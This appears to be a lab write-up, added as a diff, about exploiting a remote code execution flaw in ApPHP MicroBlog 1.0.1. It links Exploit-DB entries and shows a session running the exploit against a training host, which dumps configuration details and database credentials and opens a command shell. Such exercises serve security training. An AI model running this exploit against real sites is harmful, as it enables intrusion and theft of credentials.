@@ -1,0 +1,102 @@
+######    
+Mission provided by attack defense lab
+#####
+This version of ApPHP MicroBlog is vulnerable to remote code execution attack. 
+Your task is to find and exploit this vulnerability.
+
+#########################################################
+
+First goal: find the version of the ApPHP Microblog.
+
+Second goal: search about the vulnerability in the particular version.(There are many vulnerability in this version 
+like Multiple LFI, RCE,XSS.)
+
+Third goal: Find the exploit of the Vulnerability as it's a remote code execution exerice so we have to find the RCE exploit. 
+
+Fourth goal: Read the exploit, read about the raw input ,vulnerable parameter and then try to first exploit manually(if not working ) then run the exploit.
+
+###########################################################
+
+Version:  ApPHP MicroBlog 1.0.1
+
+###########################################################
+
+Vulnerability:  ApPHP MicroBlog 1.0.1 - Multiple Vulnerabilities -Remote code execution, Lfi.
+
+###########################################################
+Exploit-: 
+
+https://www.exploit-db.com/exploits/33030
+https://www.exploit-db.com/exploits/33070
+
+# Exploit Title: Python exploit for ApPHP MicroBlog 1.0.1 (Free Version) - RCE
+# Exploit Author: LOTFREE
+# Version: ApPHP MicroBlog 1.0.1 (Free Version)
+# EDB-ID: 33030
+
+##############################################################
+I have run this exploit from my cloud aws machine.
+
+##############################################################
+
+ec2-user@kali:~$ python apphp-microblog.py http://7jrbh5p7kvo08jv2xwva7c276.public2.attackdefenselabs.com/index.php
+  -= LOTFREE exploit for ApPHP MicroBlog 1.0.1 (Free Version) =-
+original exploit by Jiko : http://www.exploit-db.com/exploits/33030/
+[*] Testing for vulnerability...
+[+] Website is vulnerable
+
+[*] Fecthing phpinfo
+	PHP Version 5.3.10-1ubuntu3.26
+	System   Linux attackdefense.com 4.15.0-43-generic #46-Ubuntu SMP Thu Dec 6 14:45:28 UTC 2018 x86_64
+	Loaded Configuration File   /etc/php5/apache2/php.ini
+	Apache Version   Apache/2.2.22 (Ubuntu)
+	User/Group   www-data(33)/33
+	Server Root   /etc/apache2
+	DOCUMENT_ROOT   /var/www
+	PHP Version   5.3.10-1ubuntu3.26
+	allow_url_fopen  On  On
+	allow_url_include  Off  Off
+	disable_functions  pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,  pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,
+	open_basedir   no value    no value
+	safe_mode  Off  Off
+	safe_mode_exec_dir   no value    no value
+	safe_mode_gid  Off  Off
+	safe_mode_include_dir   no value    no value
+	safe_mode_allowed_env_vars  PHP_  PHP_
+	safe_mode_protected_env_vars  LD_LIBRARY_PATH  LD_LIBRARY_PATH
+
+[*] Fetching include/base.inc.php
+<?php
+			// DATABASE CONNECTION INFORMATION
+			define('DATABASE_HOST', 'localhost');	        // Database host
+			define('DATABASE_NAME', 'big');	        // Name of the database to be used
+			define('DATABASE_USERNAME', 'root');	// User name for access to database
+			define('DATABASE_PASSWORD', '');	// Password for access to database
+			define('DB_ENCRYPT_KEY', '6hpq3545z7');		// Database encryption key
+			define('DB_PREFIX', 'mb101_');		    // Unique prefix of all table names in the database
+			?>
+
+[*] Testing remote execution
+[+] Remote exec is working with system() :)
+Submit your commands, type exit to quit
+> uname -a
+Linux attackdefense.com 4.15.0-43-generic #46-Ubuntu SMP Thu Dec 6 14:45:28 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+
+
+> 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
